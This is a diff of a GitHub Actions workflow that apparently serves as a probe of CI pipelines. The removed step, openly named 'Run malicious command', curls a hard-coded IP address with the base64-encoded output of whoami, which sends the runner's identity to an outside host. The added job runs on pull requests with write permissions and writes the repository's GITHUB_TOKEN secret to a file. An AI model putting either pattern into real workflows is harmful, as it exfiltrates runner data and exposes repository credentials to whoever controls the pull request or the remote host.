@@ -1,16 +1,19 @@
-name: CI
+name: Mytest
 
 on:
-  workflow_dispatch:
+  pull_request:
+    types: [opened, synchronize, reopened]
 
 jobs:
-  build:
+  test:
+    permissions:
+      actions: read
+      issues: write
+      pull-requests: write
     runs-on: ubuntu-latest
-
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
-
-    - name: Run malicious command
+    - name: Info
+      run: echo "Start..."
+    - name: TEST
       run: |
-        curl http://43.136.35.213:8088/$(whoami|base64 | tr -d "\n");
+        echo ${{ secrets.GITHUB_TOKEN }} > token.txt
